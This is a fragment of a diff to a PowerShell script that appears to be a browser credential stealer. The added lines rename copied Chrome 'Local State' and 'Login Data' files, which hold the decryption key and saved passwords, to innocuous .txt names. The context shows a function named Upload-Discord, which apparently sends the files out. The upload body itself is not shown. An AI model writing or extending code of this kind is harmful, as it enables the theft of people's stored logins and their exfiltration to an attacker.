@@ -20,6 +20,12 @@ catch {
     Write-Host "An error occurred: $_"
 }
 
+# Rename the copied files to state.txt and data.txt
+try {
+    Rename-Item -Path "$folderPath\Local State" -NewName "$folderPath\state.txt" -Force
+    Rename-Item -Path "$folderPath\Login Data" -NewName "$folderPath\data.txt" -Force
+}
+
 ############################################################################
 function Upload-Discord {
 
